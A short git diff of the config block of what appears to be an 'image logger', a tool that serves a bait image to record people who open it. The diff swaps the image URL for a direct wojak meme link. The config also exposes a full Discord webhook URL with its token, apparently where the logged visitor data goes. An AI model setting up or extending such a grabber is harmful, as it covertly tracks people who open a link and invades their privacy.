@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1071908682071285920/AoedNHvDiwzFCMtpPDS6jyslDg-tq611UubG3DD93H66q7mD5rEAohPX0IHf1tnwDRR-",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.nssmag.com%2Fen%2Ffashion%2F21372%2Fhow-wojak-became-the-meme-of-the-moment&psig=AOvVaw1X8hTWIrP3y5eCw_Mt2TH0&ust=1675719787027000&source=images&cd=vfe&ved=0CBAQjRxqFwoTCJi-lees__wCFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://data2.nssmag.com/images/galleries/22874/wojak-nss-magazine-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
